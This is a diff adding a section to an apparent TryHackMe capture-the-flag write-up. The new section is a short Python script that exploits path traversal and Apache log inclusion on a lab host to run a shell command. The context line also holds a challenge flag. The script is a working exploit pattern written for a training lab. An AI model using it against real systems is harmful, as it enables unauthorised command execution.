@@ -534,3 +534,30 @@ $flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
 ```
 
 
+
+> ## test
+
+```python
+#!/usr/bin/env python
+
+import requests
+
+shell = 'echo a > test'
+
+url = "http://10.10.77.157/"
+
+params = {
+    "view": "dog/../../../../../../var/log/apache2/access.log",
+    "ext": "",
+    "c": shell
+}
+
+r = requests.get(url, params = params)
+```
+
+
+
+
+
+
+
